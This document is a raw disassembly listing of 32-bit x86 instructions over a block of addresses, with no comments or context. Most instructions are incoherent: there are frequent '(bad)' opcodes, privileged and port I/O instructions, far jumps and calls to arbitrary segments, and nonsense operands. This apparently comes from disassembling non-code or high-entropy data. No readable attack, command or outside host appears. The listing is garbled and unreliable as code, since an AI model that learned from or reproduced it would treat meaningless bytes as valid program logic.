  41da26:	fs push 0x4a
  41da29:	jmp    0x4c88:0x9a535acb
  41da30:	mov    eax,0x5b2e8be0
  41da35:	rcr    ah,1
  41da37:	and    DWORD PTR [ebx],edx
  41da39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da3a:	fsubr  QWORD PTR [ebp+0x4b]
  41da3d:	adc    eax,0x45d0ea29
  41da42:	lods   al,BYTE PTR ds:[esi]
  41da43:	sub    edi,DWORD PTR [eax+ecx*1]
  41da46:	aad    0x19
  41da48:	lds    edi,FWORD PTR [esi+0x22]
  41da4b:	and    edi,esp
  41da4d:	cmp    eax,0x8b4328e6
  41da52:	pop    ebx
  41da53:	ret    0x102f
  41da56:	clc    
  41da57:	repz arpl WORD PTR [eax+0x6a91eb5e],si
  41da5e:	xchg   DWORD PTR [edx+0xbcc6031],esp
  41da64:	inc    esp
  41da65:	inc    ecx
  41da66:	fwait
  41da67:	out    0x7,al
  41da69:	fs (bad) 
  41da6b:	cmp    dh,ah
  41da6d:	mov    ebx,DWORD PTR [ebp+0x979397d]
  41da73:	xchg   BYTE PTR [edi+0x6fa86ba1],al
  41da79:	or     ebx,ecx
  41da7b:	pop    esp
  41da7c:	jle    0x41da47
  41da7e:	push   ebx
  41da7f:	push   es
  41da80:	test   eax,0x1c96a0e5
  41da85:	loope  0x41daae
  41da87:	push   edx
  41da88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da89:	pop    edi
  41da8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da8b:	cmp    ah,BYTE PTR [ebx-0xbee3dd3]
  41da91:	mov    ebx,DWORD PTR ds:[edx-0x30]
  41da95:	inc    edx
  41da96:	and    eax,0x277370b3
  41da9b:	addr16 in eax,0x4a
  41da9e:	xchg   edx,eax
  41da9f:	and    esi,DWORD PTR [ecx-0x293ee3a1]
  41daa5:	or     al,BYTE PTR [edi-0x3]
  41daa8:	xchg   BYTE PTR [ecx+0x43],cl
  41daab:	xchg   ebp,eax
  41daac:	mov    ecx,0x9cb64671
  41dab1:	or     eax,0xb14de095
  41dab6:	jbe    0x41daea
  41dab8:	xadd   BYTE PTR [ebx],cl
  41dabb:	jns    0x41dae6
  41dabd:	sub    DWORD PTR [edi],esp
  41dabf:	fmulp  st(4),st
  41dac1:	sbb    al,0x8
  41dac3:	mov    BYTE PTR [eax],dl
  41dac5:	xor    ebx,DWORD PTR [edi]
  41dac7:	sar    ah,cl
  41dac9:	mov    gs,esp
  41dacb:	push   cs
  41dacc:	idiv   DWORD PTR [ecx+0x75]
  41dacf:	(bad)  
  41dad0:	enter  0xae37,0x52
  41dad4:	mov    cl,0x9d
  41dad6:	sub    al,0xb6
  41dad8:	call   FWORD PTR [eax+0x24]
  41dadb:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41dadd:	repz loope 0x41db14
  41dae0:	mov    es,WORD PTR [ebx+esi*1+0x7bbf4623]
  41dae7:	inc    ebx
  41dae8:	push   esp
  41dae9:	and    BYTE PTR [eax-0x80],bl
  41daec:	cs inc ebx
	...
  41db56:	sbb    al,0x15
  41db58:	jnp    0x41dbad
  41db5a:	jnp    0x41dbdb
  41db5c:	cmp    al,0x5f
  41db5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db5f:	push   edi
  41db60:	sbb    ebp,0xffffffbe
  41db63:	jne    0x41dbdd
  41db65:	imul   esp,DWORD PTR [edi+0x3f],0x1000001
  41db6c:	add    BYTE PTR [eax],al
  41db6e:	je     0x41db0d
  41db70:	repz jge 0x41db6c
  41db73:	sub    eax,0x69736f57
  41db78:	xlat   BYTE PTR ds:[ebx]
  41db79:	(bad)  
  41db7a:	push   cs
  41db7b:	cld    
  41db7c:	outs   dx,BYTE PTR ds:[esi]
  41db7d:	push   esi
  41db7e:	pushf  
  41db7f:	mov    dl,0xca
  41db81:	mov    dl,0xbe
  41db83:	pushf  
  41db84:	pusha  
  41db85:	arpl   WORD PTR [edx],sp
  41db87:	lods   eax,DWORD PTR ds:[esi]
  41db88:	mov    eax,0xa467ddca
  41db8d:	mov    WORD PTR ds:0x929bf20a,ss
  41db93:	cwde   
  41db94:	pop    edi
  41db95:	xchg   edx,eax
  41db96:	out    dx,al
  41db97:	sub    ebp,eax
  41db99:	je     0x41db77
  41db9b:	lds    ecx,FWORD PTR ds:0x34c8ea32
  41dba1:	outs   dx,DWORD PTR ds:[esi]
  41dba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dba3:	mov    ah,0xcd
  41dba5:	mov    edx,0xa040d06f
  41dbaa:	jnp    0x41dc0a
  41dbac:	hlt    
  41dbad:	adc    ah,dl
  41dbaf:	jbe    0x41dc13
  41dbb1:	xor    DWORD PTR [ebp+0x14],0x64
  41dbb5:	dec    esi
  41dbb6:	push   ebx
  41dbb7:	jnp    0x41db6c
  41dbb9:	les    ecx,FWORD PTR [ecx-0x1]
  41dbbc:	or     edi,DWORD PTR [edi+0x52]
  41dbbf:	and    al,0x91
  41dbc1:	mov    ch,0xf3
  41dbc3:	into   
  41dbc4:	arpl   WORD PTR ds:[ecx+0x16ff5cd2],cx
  41dbcb:	or     al,0x2
  41dbcd:	xchg   esp,eax
  41dbce:	rcpps  xmm4,XMMWORD PTR [ecx-0x34001fb6]
  41dbd5:	shl    bh,cl
  41dbd7:	mov    gs,WORD PTR [edi+ebp*2]
  41dbda:	push   0x7
  41dbdc:	les    ebp,FWORD PTR ds:0x41e1cbe3
  41dbe2:	ins    DWORD PTR es:[edi],dx
  41dbe3:	jmp    0x2f24170
  41dbe8:	pushf  
  41dbe9:	shr    DWORD PTR [ebx-0x11194920],1
  41dbef:	or     al,0xc6
  41dbf1:	jmp    0xd5ece274
  41dbf6:	pop    esi
  41dbf7:	mov    ah,0xc5
  41dbf9:	dec    ecx
  41dbfa:	sbb    esi,DWORD PTR [ecx-0x7dcd9139]
  41dc00:	data16 out dx,al
  41dc02:	and    dl,bh
  41dc04:	jmp    0x2a8ac63b
  41dc09:	jb     0x41dbdc
  41dc0b:	scas   al,BYTE PTR es:[edi]
  41dc0c:	scas   al,BYTE PTR es:[edi]
  41dc0d:	pop    eax
  41dc0e:	in     eax,dx
  41dc0f:	enter  0x9f68,0x8a
  41dc13:	(bad)  
  41dc14:	mov    bl,0x7e
  41dc16:	cmp    bh,al
  41dc18:	loope  0x41dba6
  41dc1a:	add    eax,0x817fed34
  41dc1f:	stc    
  41dc20:	jne    0x41dc45
  41dc22:	out    dx,eax
  41dc23:	dec    edi
  41dc24:	fstp   TBYTE PTR [ebx+0x3cc5d21]
  41dc2a:	mov    al,ds:0xc23d75fb
  41dc2f:	xchg   ebp,eax
  41dc30:	and    eax,esi
  41dc32:	dec    ebp
  41dc33:	cmp    dl,bh
  41dc35:	(bad)  
  41dc36:	out    dx,al
  41dc37:	bound  ebp,QWORD PTR [esi+0x60]
  41dc3a:	daa    
  41dc3b:	(bad)  
  41dc3c:	push   0xffffffe5
  41dc3e:	fmul   QWORD PTR [eax-0x29fbb2c6]
  41dc44:	mov    gs,WORD PTR [edx+0x20]
  41dc47:	push   0x15
  41dc49:	and    esi,edx
  41dc4b:	cli    
  41dc4c:	pop    ds
  41dc4d:	mov    cl,0x43
  41dc4f:	cmp    eax,DWORD PTR [edi+esi*8]
  41dc52:	mov    ecx,0xbc3183f7
  41dc57:	jmp    0x8b937227
  41dc5c:	pop    ecx
  41dc5d:	test   al,0xa5
  41dc5f:	add    DWORD PTR [ebx+0x240dcc53],ecx
  41dc65:	jg     0x41dcaf
  41dc67:	(bad)  
  41dc69:	leave  
  41dc6a:	mov    ebx,0x24d247
	...
  41dcd3:	add    BYTE PTR [eax],al
  41dcd5:	add    BYTE PTR [edi-0x36],ch
  41dcd8:	adc    eax,0xefdfb598
  41dcdd:	jmp    DWORD PTR [edi-0x44f2fb0]
  41dce3:	xchg   esp,eax
  41dce4:	std    
  41dce5:	push   edi
  41dce6:	addr16 inc eax
  41dce8:	add    DWORD PTR [eax],eax
  41dcea:	add    BYTE PTR [ecx],al
  41dcec:	add    BYTE PTR [eax],al
  41dcee:	(bad)  
  41dcef:	rol    esi,cl
  41dcf1:	test   DWORD PTR [ebx+0x61],ebx
  41dcf4:	adc    eax,0x7719b7a6
  41dcf9:	ds jnp 0x41dccf
  41dcfc:	mov    WORD PTR [eax+0x3],?
  41dcff:	jo     0x41dc93
  41dd01:	aas    
  41dd02:	or     BYTE PTR [ecx+0x106b2a8e],bh
  41dd08:	mov    esi,0x530d64e4
  41dd0d:	xor    BYTE PTR [eax+0x48],dl
  41dd10:	js     0x41dcb1
  41dd12:	sbb    BYTE PTR [eax+ebp*8],dl
  41dd15:	add    DWORD PTR [eax-0x31],0xffffff98
  41dd19:	dec    edi
  41dd1a:	and    cl,BYTE PTR [edx+ebp*4-0x7b32bc31]
  41dd21:	cmp    esi,ebx
  41dd23:	test   eax,0x2e4f5f70
  41dd28:	rcr    BYTE PTR [esi-0x311ad6be],1
  41dd2e:	les    ebx,FWORD PTR [eax+0x6259d92a]
  41dd34:	jae    0x41ddb5
  41dd36:	inc    esp
  41dd37:	xchg   ecx,eax
  41dd38:	in     al,0x87
  41dd3a:	pop    edx
  41dd3b:	in     eax,dx
  41dd3c:	mov    ds:0x320b22c5,al
  41dd41:	inc    ebp
  41dd42:	mov    ebx,0x8e57f680
  41dd47:	fwait
  41dd48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd49:	adc    esi,DWORD PTR [eax]
  41dd4b:	jb     0x41dd8f
  41dd4d:	cmc    
  41dd4e:	ffree  st(6)
  41dd50:	xor    eax,0xef488f87
  41dd55:	mov    ecx,0x370e57c4
  41dd5a:	repnz push ss
  41dd5c:	mov    al,ds:0x225122bb
  41dd61:	xor    al,0xe8
  41dd63:	xor    bh,BYTE PTR gs:[ecx-0x2d]
  41dd67:	sar    DWORD PTR [eax-0x20],1
  41dd6a:	mov    DWORD PTR [eax],0xb05987fa
  41dd70:	popa   
  41dd71:	jmp    0xf8d:0xb99ae076
  41dd78:	dec    eax
  41dd79:	pop    esi
  41dd7a:	data16 adc BYTE PTR [edx+ecx*4+0x46c10b3e],ah
  41dd82:	jl     0x41ddab
  41dd84:	mov    ah,0xa7
  41dd86:	push   ebx
  41dd87:	xor    edx,eax
  41dd89:	sbb    eax,0x60
  41dd8c:	(bad)  
  41dd8d:	je     0x41ddd0
  41dd8f:	or     DWORD PTR [ecx+ecx*8-0x5f80ac91],0xffffff9c
  41dd97:	out    dx,al
  41dd98:	pcmpeqd mm1,QWORD PTR [esi+0x6837126a]
  41dd9f:	xor    eax,0x693196da
  41dda4:	dec    esi
  41dda5:	test   al,0x87
  41dda7:	jnp    0x41de06
  41dda9:	std    
  41ddaa:	xchg   esi,eax
  41ddab:	cmp    eax,DWORD PTR [ecx+ebx*4]
  41ddae:	scas   al,BYTE PTR es:[edi]
  41ddaf:	cmp    DWORD PTR [ecx+0xf],edx
  41ddb2:	xlat   BYTE PTR ds:[ebx]
  41ddb3:	sub    BYTE PTR [edx-0x1d],cl
  41ddb6:	xor    ah,0x34
  41ddb9:	mov    ds:0x9cac807c,eax
  41ddbe:	out    0x15,al
  41ddc0:	mov    ah,0x40
  41ddc2:	sub    edx,DWORD PTR [esi+0x7f70f262]
  41ddc8:	jmp    0x41de32
  41ddca:	pop    ds
  41ddcb:	add    dh,BYTE PTR [eax+edi*8]
  41ddce:	out    dx,eax
  41ddcf:	xchg   edx,eax
  41ddd0:	sub    al,0x9c
  41ddd2:	fist   WORD PTR [edx-0x2cfa53ba]
  41ddd8:	or     BYTE PTR [esi],0x26
  41dddb:	ficomp DWORD PTR [esp+ebx*2-0x72132880]
  41dde2:	adc    esi,DWORD PTR [ebp+0x2a96c23c]
  41dde8:	jae    0x41dd8a
  41ddea:	mov    bl,0xd1
  41ddec:	retf   
  41dded:	outs   dx,DWORD PTR ds:[esi]
	...
  41de56:	and    bl,dh
  41de58:	das    
  41de59:	cmp    bh,0xde
  41de5c:	lods   eax,DWORD PTR ds:[esi]
  41de5d:	repz pop ds
  41de5f:	mov    bl,BYTE PTR [esi-0x41]
  41de62:	jl     0x41dea0
  41de64:	(bad)  
  41de65:	mov    edx,0x14167
  41de6a:	add    BYTE PTR [ecx],al
  41de6c:	add    BYTE PTR [eax],al
  41de6e:	clts   
  41de70:	std    
  41de71:	iret   
  41de72:	mov    ah,0xbf
  41de74:	xor    DWORD PTR [ebp+0x68],0x1
  41de78:	push   ebx
  41de79:	xor    bl,ch
  41de7b:	push   ds
  41de7c:	inc    edx
  41de7d:	mov    ss,WORD PTR ds:0xd72f76f7
  41de83:	idiv   DWORD PTR [esi+0x47cd20a7]
  41de89:	push   ss
  41de8a:	repnz gs ins DWORD PTR es:[edi],dx
  41de8d:	cmp    BYTE PTR [ebx-0x25],al
  41de90:	mov    bl,BYTE PTR [ebp+eiz*4+0x39]
  41de94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de95:	push   ecx
  41de96:	sub    esi,ebx
  41de98:	xchg   esi,eax
  41de99:	push   ebp
  41de9a:	rcr    DWORD PTR [ebp-0x3d],1
  41de9d:	xchg   ecx,eax
  41de9e:	and    BYTE PTR [edx-0x46],dh
  41dea1:	jns    0x41deb3
  41dea3:	mov    bh,0xc0
  41dea5:	jne    0x41deff
  41dea7:	push   0xc8a5d956
  41deac:	(bad)  
  41dead:	mov    edx,0x3e832056
  41deb2:	add    DWORD PTR [edx+0x7e],ebp
  41deb5:	xchg   DWORD PTR [edi-0x68a239f8],eax
  41debb:	push   ebx
  41debc:	out    dx,al
  41debd:	and    eax,0xcb043a96
  41dec2:	inc    edi
  41dec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dec4:	push   ebx
  41dec5:	fist   DWORD PTR [eax]
  41dec7:	stc    
  41dec8:	mov    esp,0x874a68b0
  41decd:	dec    edx
  41dece:	das    
  41decf:	pusha  
  41ded0:	pop    edi
  41ded1:	ss into 
  41ded3:	xchg   esp,eax
  41ded4:	aas    
  41ded5:	(bad)  
  41ded6:	call   0x8b11:0x2ff2bdc7
  41dedd:	lock fcomp QWORD PTR [eax-0x27ef75dc]
  41dee4:	sub    dl,al
  41dee6:	in     eax,0xae
  41dee8:	sub    cl,BYTE PTR [edx+0x7e]
  41deeb:	loop   0x41defa
  41deed:	ss loop 0x41df66
  41def0:	lods   eax,DWORD PTR ds:[esi]
  41def1:	sbb    DWORD PTR [edx+0x5d],0xa94d7405
  41def8:	(bad)  
  41def9:	test   DWORD PTR [edx+0x24],esp
  41defc:	sar    ebx,1
  41defe:	loope  0x41df5d
  41df00:	shl    BYTE PTR [eax+0x16622355],1
  41df06:	xor    eax,0xaf463882
  41df0b:	and    bl,ch
  41df0d:	shl    dl,1
  41df0f:	jo     0x41df79
  41df11:	gs (bad) 
  41df13:	int3   
  41df14:	inc    ecx
  41df15:	(bad)  
  41df16:	xchg   ebx,eax
  41df17:	mul    BYTE PTR [esi]
  41df19:	and    BYTE PTR [ebp+0x6877e896],0x89
  41df20:	jae    0x41df88
  41df22:	add    bh,BYTE PTR [esi+eiz*1]
  41df25:	cmp    edx,DWORD PTR [edi+0x5e09744]
  41df2b:	sub    BYTE PTR [ebx],0xf2
  41df2e:	sti    
  41df2f:	retf   
  41df30:	jl     0x41df9a
  41df32:	lock fnsave [ecx+0x2d1f29f6]
  41df39:	sbb    dh,dl
  41df3b:	(bad)  
  41df3d:	jmp    0xace653e0
  41df42:	xor    al,0xe1
  41df44:	sbb    edx,edx
  41df46:	stos   BYTE PTR es:[edi],al
  41df47:	cwde   
  41df48:	cmp    cl,bh
  41df4a:	cld    
  41df4b:	push   ebp
  41df4c:	mov    al,0xc1
  41df4e:	and    eax,0xb4c149fa
  41df53:	pusha  
  41df54:	push   0xffffff92
  41df56:	dec    ecx
  41df57:	aaa    
  41df58:	and    edi,DWORD PTR [eax+0xa]
  41df5b:	and    DWORD PTR [eax+0x7b36e99c],0xf0fe305c
  41df65:	sbb    BYTE PTR [ecx-0x17811c0e],dh
  41df6b:	xor    ch,al
  41df6d:	and    al,BYTE PTR [eax]
	...
  41dfd3:	add    BYTE PTR [eax],al
  41dfd5:	add    BYTE PTR [edi],bh
  41dfd7:	daa    
  41dfd8:	push   ss
  41dfd9:	cld    
  41dfda:	push   ds
  41dfdb:	std    
  41dfdc:	jmp    edi
  41dfde:	dec    edi
  41dfdf:	push   0xaf759ce9
  41dfe4:	inc    eax
  41dfe5:	arpl   WORD PTR [edi+0x42],sp
  41dfe8:	add    DWORD PTR [eax],eax
  41dfea:	add    BYTE PTR [ecx],al
  41dfec:	add    BYTE PTR [eax],al
  41dfee:	push   eax
  41dfef:	xor    eax,0x9b766851
  41dff4:	and    esp,DWORD PTR [eax-0xb9fd6f4]
  41dffa:	pop    es
  41dffb:	jmp    0x41df95
  41dffd:	inc    ebx
  41dffe:	xor    DWORD PTR gs:[edi-0x33d824eb],esi
  41e005:	jp     0x41e05e
  41e007:	dec    ecx
  41e008:	retf   
  41e009:	stos   DWORD PTR es:[edi],eax
  41e00a:	lods   eax,DWORD PTR ds:[esi]
  41e00b:	and    eax,0x39fcf863
  41e010:	cdq    
  41e011:	mov    ch,0xf7
  41e013:	das    
  41e014:	jecxz  0x41dfab
  41e016:	es push esi
  41e018:	repnz sbb DWORD PTR [edi+esi*1],ebp
  41e01c:	sahf   
  41e01d:	cwde   
  41e01e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e01f:	retf   0x80b8
  41e022:	or     BYTE PTR [edx-0x12],al
  41e025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e026:	shl    DWORD PTR [edx],1
  41e028:	sub    al,0x55
  41e02a:	repnz dec edi
  41e02c:	or     DWORD PTR [ecx],ebp
  41e02e:	aad    0x64
  41e030:	cdq    
  41e031:	mov    ds:0x9b8bdb55,al
  41e036:	(bad)  
  41e037:	jmp    0x41e0b0
  41e039:	mov    dh,0xe5
  41e03b:	or     BYTE PTR [eax],bl
  41e03d:	xchg   esi,eax
  41e03e:	sbb    ch,BYTE PTR [ebp+0x5e43daf5]
  41e044:	fdecstp 
  41e046:	mov    esp,0xdb1f03d4
  41e04b:	shr    DWORD PTR [eax+0x4897eb71],cl
  41e051:	test   edx,eax
  41e053:	scas   eax,DWORD PTR es:[edi]
  41e054:	mov    ds:0x5dd5e8d9,al
  41e059:	stos   DWORD PTR es:[edi],eax
  41e05a:	test   eax,0xed71c46e
  41e05f:	xchg   edx,eax
  41e060:	aam    0x4
  41e062:	popa   
  41e063:	iret   
  41e064:	ficomp DWORD PTR [edi]
  41e066:	cmp    BYTE PTR [edi],dl
  41e068:	jge    0x41e07f
  41e06a:	mov    bh,0x5a
  41e06c:	test   ebx,0x96bc6f79
  41e072:	sub    esp,DWORD PTR [ebp+0x5a394bd3]
  41e078:	ja     0x41e074
  41e07a:	xchg   edx,eax
  41e07b:	inc    esi
  41e07c:	push   ss
  41e07d:	xchg   edx,eax
  41e07e:	std    
  41e07f:	cmp    ebx,DWORD PTR [edx]
  41e081:	shl    BYTE PTR [esi-0x577cb59b],1
  41e087:	loope  0x41e0fd
  41e089:	ss jnp 0x41e086
  41e08c:	out    dx,eax
  41e08d:	or     eax,0xd1b10740
  41e092:	(bad)  
  41e093:	mov    ebx,0x7a8ab7d3
  41e098:	icebp  
  41e099:	addr16 xchg esp,eax
  41e09b:	jl     0x41e094
  41e09d:	pop    ebx
  41e09e:	hlt    
  41e09f:	in     al,0xed
  41e0a1:	xchg   ecx,eax
  41e0a2:	sar    DWORD PTR [ecx],1
  41e0a4:	test   al,0x5d
  41e0a6:	or     DWORD PTR [edi],0xffffff8c
  41e0a9:	mov    DWORD PTR [edi],0x1b8b746d
  41e0af:	call   0xda95:0x1905a256
  41e0b6:	inc    eax
  41e0b7:	aad    0xa7
  41e0b9:	xchg   edi,eax
  41e0ba:	pop    edx
  41e0bb:	ins    BYTE PTR es:[edi],dx
  41e0bc:	mov    ecx,0xf8833c68
  41e0c1:	jbe    0x41e13d
  41e0c3:	xor    bh,BYTE PTR [ecx-0x5620c70a]
  41e0c9:	push   esp
  41e0ca:	and    al,0xc3
  41e0cc:	ror    ecx,cl
  41e0ce:	js     0x41e110
  41e0d0:	xchg   bl,dh
  41e0d2:	push   edi
  41e0d3:	addr16 pop es
  41e0d5:	not    DWORD PTR ds:0x35607da5
  41e0db:	pop    edx
  41e0dc:	ret    
  41e0dd:	int3   
  41e0de:	lods   eax,DWORD PTR ds:[esi]
  41e0df:	dec    edi
  41e0e0:	scas   al,BYTE PTR es:[edi]
  41e0e1:	inc    edi
  41e0e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0e3:	outs   dx,BYTE PTR ds:[esi]
  41e0e4:	mov    ebx,0xbd9d00f9
  41e0e9:	aaa    
  41e0ea:	test   BYTE PTR [esi+0x7b],ch
  41e0ed:	inc    BYTE PTR [eax]
	...
  41e153:	add    BYTE PTR [eax],al
  41e155:	add    BYTE PTR [edi+0x53],cl
  41e158:	add    al,0xc
  41e15a:	sbb    al,0x5f
  41e15c:	dec    edi
  41e15d:	push   ebx
  41e15e:	out    0x6d,eax
  41e160:	aad    0x48
  41e162:	ins    BYTE PTR es:[edi],dx
  41e163:	xor    eax,0x4367b5d1
  41e168:	add    DWORD PTR [eax],eax
  41e16a:	add    BYTE PTR [ecx],al
  41e16c:	add    BYTE PTR [eax],al
  41e16e:	mov    ebp,0x31c0d454
  41e173:	dec    eax
  41e174:	dec    eax
  41e175:	xchg   ecx,eax
  41e176:	adc    eax,0xe9119a15
  41e17b:	push   ds
  41e17c:	jo     0x41e142
  41e17e:	(bad)  
  41e17f:	loop   0x41e12d
  41e181:	mov    eax,ds:0x51fe8612
  41e186:	sbb    DWORD PTR [edx-0x67631d92],edi
  41e18c:	pop    ebx
  41e18d:	pop    esp
  41e18e:	add    BYTE PTR [eax-0x75a722fe],ah
  41e194:	adc    al,0xf2
  41e196:	icebp  
  41e197:	stc    
  41e198:	imul   DWORD PTR [ebx]
  41e19a:	xor    DWORD PTR [edx-0x221e3141],0x91525dd5
  41e1a4:	test   ch,al
  41e1a6:	mov    cl,0xc3
  41e1a8:	mov    ah,0x11
  41e1aa:	fisub  DWORD PTR [edi]
  41e1ac:	or     BYTE PTR [edx+ebp*1+0x75707fce],bl
  41e1b3:	push   0xcc10f0f7
  41e1b8:	out    dx,eax
  41e1b9:	lods   eax,DWORD PTR ds:[esi]
  41e1ba:	and    dh,ah
  41e1bc:	or     BYTE PTR [ebx],dh
  41e1be:	sub    eax,0x91e8f576
  41e1c3:	jecxz  0x41e1d9
  41e1c5:	ins    BYTE PTR es:[edi],dx
  41e1c6:	shr    BYTE PTR [eax],0x86
  41e1c9:	and    al,BYTE PTR [eax+0x33]
  41e1cc:	(bad)  
  41e1cd:	ds fldln2 
  41e1d0:	mov    esi,0x7bf09f2a
  41e1d5:	inc    ebp
  41e1d6:	or     eax,DWORD PTR [ebp+0x23b6a401]
  41e1dc:	daa    
  41e1dd:	pop    esp
  41e1de:	jne    0x41e1a4
  41e1e0:	enter  0x33d2,0x1c
  41e1e4:	xchg   ebx,eax
  41e1e5:	aas    
  41e1e6:	jp     0x41e1a8
  41e1e8:	lods   eax,DWORD PTR ds:[esi]
  41e1e9:	and    DWORD PTR [ebx-0x5f],esp
  41e1ec:	xchg   ebp,eax
  41e1ed:	xor    eax,0x2b04440c
  41e1f2:	nop
  41e1f3:	repz add al,0xaf
  41e1f6:	sti    
  41e1f7:	lods   eax,DWORD PTR ds:[esi]
  41e1f8:	sub    eax,0xfdee5dec
  41e1fd:	out    dx,al
  41e1fe:	mov    bl,0xce
  41e200:	adc    bh,BYTE PTR ds:0x5cb5ba67
  41e206:	and    DWORD PTR [eax],0xffffffac
  41e209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e20a:	or     edi,edi
  41e20c:	xchg   esp,eax
  41e20d:	push   ss
  41e20e:	cmp    eax,0x7ea06982
  41e213:	mov    ds:0x55717f,eax
  41e218:	sbb    edx,DWORD PTR ds:0x743fe305
  41e21e:	in     eax,0x4f
  41e220:	rcr    DWORD PTR [ecx+0x4a93f715],0x4c
  41e227:	mov    ds:0x18568936,al
  41e22c:	repz push ss
  41e22e:	fwait
  41e22f:	and    eax,0x7c9543ed
  41e234:	inc    esi
  41e235:	dec    esp
  41e236:	push   eax
  41e237:	into   
  41e238:	adc    al,0x48
  41e23a:	inc    esp
  41e23b:	rcl    eax,cl
  41e23d:	fdivr  QWORD PTR [edi-0x29700434]
  41e243:	sete   BYTE PTR [edx+0x373d34fd]
  41e24a:	je     0x41e240
  41e24c:	(bad)  
  41e24d:	in     al,0xed
  41e24f:	pop    ds
  41e250:	jmp    0xa67a0712
  41e255:	mul    eax
  41e257:	pop    edx
  41e258:	jecxz  0x41e2a6
  41e25a:	repz cmp DWORD PTR [esi+0x75572d89],0x5
  41e262:	sbb    DWORD PTR [edi+edx*8],ecx
  41e265:	mov    dh,0xa8
  41e267:	jns    0x41e287
  41e269:	push   ds
  41e26a:	push   0xfcbb1b
	...
  41e2d3:	add    BYTE PTR [eax],al
  41e2d5:	add    BYTE PTR [ebx-0x1988fe],ch
  41e2db:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e2e1:	or     al,0x31
  41e2e3:	dec    edi
  41e2e4:	inc    edx
  41e2e5:	mov    ds:0x14467,al
  41e2ea:	add    BYTE PTR [ecx],al
  41e2ec:	add    BYTE PTR [eax],al
  41e2ee:	xchg   esi,eax
  41e2ef:	aas    
  41e2f0:	pop    esp
  41e2f1:	jmp    0xcfd7:0xfd22173e
  41e2f8:	mov    bl,0x1c
  41e2fa:	inc    ecx
  41e2fb:	pop    ebp
  41e2fc:	out    0xef,eax
  41e2fe:	or     eax,0xa1242752
  41e303:	jns    0x41e36b
  41e305:	sub    dl,BYTE PTR [ebp-0x16]
  41e308:	hlt    
  41e309:	inc    edi
  41e30a:	inc    edi
  41e30b:	fistp  DWORD PTR [eax+0x62]
  41e30e:	mov    bl,0x1b
  41e310:	call   0x709f:0xcbbd786d
  41e317:	pop    ss
  41e318:	imul   DWORD PTR [ebx]
  41e31a:	data16 mov ah,0x98
  41e31d:	popa   
  41e31e:	add    DWORD PTR [ecx+0x23],esi
  41e321:	pop    edi
  41e322:	clc    
  41e323:	mov    DWORD PTR [ecx+0x2e235a24],esp
  41e329:	jno    0x41e38b
  41e32b:	inc    eax
  41e32c:	cmp    al,0x51
  41e32e:	sti    
  41e32f:	adc    ebx,DWORD PTR [ebx]
  41e331:	mov    eax,0xe88401b9
  41e336:	jle    0x41e33f
  41e338:	push   0x7502ba42
  41e33d:	cmp    DWORD PTR [ecx-0x22],edx
  41e340:	gs push ss
  41e342:	div    BYTE PTR [eax+0x3e]
  41e345:	adc    bl,dl
  41e347:	mov    ebx,0xd1e1d9c2
  41e34c:	fdiv   st,st(6)
  41e34e:	outs   dx,DWORD PTR ds:[esi]
  41e34f:	ds xchg edi,eax
  41e351:	mov    eax,0x7be88ceb
  41e356:	retf   
  41e357:	and    dh,ah
  41e359:	popf   
  41e35a:	pop    ebp
  41e35b:	add    al,0x4f
  41e35d:	pop    ebx
  41e35e:	pop    ebx
  41e35f:	sub    DWORD PTR [edi+0x5ed344e2],esp
  41e365:	push   esp
  41e366:	jmp    FWORD PTR [ecx+esi*1-0x18]
  41e36a:	pusha  
  41e36b:	enter  0x17a5,0xa5
  41e36f:	repnz stc 
  41e371:	(bad)  
  41e372:	pop    ebp
  41e373:	call   0xa8d0:0xde617169
  41e37a:	pusha  
  41e37b:	jmp    0xdc1dd0f0
  41e380:	or     BYTE PTR [edi+0x5d],0x46
  41e384:	lods   al,BYTE PTR ds:[esi]
  41e385:	mov    dl,0x37
  41e387:	call   0xb3e5:0xddd05d1e
  41e38e:	scas   al,BYTE PTR es:[edi]
  41e38f:	mov    ecx,edx
  41e391:	ret    
  41e392:	icebp  
  41e393:	shr    BYTE PTR [ebp+0x46],0xad
  41e397:	jecxz  0x41e390
  41e399:	je     0x41e3c3
  41e39b:	add    DWORD PTR [ecx+0x6255b0e0],0xcc9bea28
  41e3a5:	or     ah,al
  41e3a7:	hlt    
  41e3a8:	xchg   BYTE PTR [ebx],ah
  41e3aa:	test   BYTE PTR [edi+0x105b8d09],ah
  41e3b0:	bound  esp,QWORD PTR [edx+eiz*2+0x4b]
  41e3b4:	scas   al,BYTE PTR es:[edi]
  41e3b5:	jmp    0x8dd6:0x189be45e
  41e3bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3bd:	add    BYTE PTR [ecx-0x5d37ae54],bl
  41e3c3:	mov    cl,0x98
  41e3c5:	push   ecx
  41e3c6:	gs fld1 
  41e3c9:	adc    BYTE PTR [edi],al
  41e3cb:	lock push eax
  41e3cd:	jecxz  0x41e3a6
  41e3cf:	or     DWORD PTR [ebp+0x6b0075d0],ebp
  41e3d5:	int3   
  41e3d6:	leave  
  41e3d7:	jecxz  0x41e3fd
  41e3d9:	push   0xed3b4524
  41e3de:	jp     0x41e3e8
  41e3e0:	xchg   edi,eax
  41e3e1:	cdq    
  41e3e2:	xlat   BYTE PTR ds:[ebx]
  41e3e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3e4:	xchg   ebp,eax
  41e3e5:	xor    eax,0xdc0517ea
  41e3ea:	sub    eax,0x996b93
	...
  41e453:	add    BYTE PTR [eax],al
  41e455:	add    BYTE PTR [ecx-0xe088ee],cl
  41e45b:	jg     0x41e446
  41e45d:	xchg   esi,eax
  41e45e:	or     DWORD PTR [edx+0x18],0x31ea1b09
  41e465:	popf   
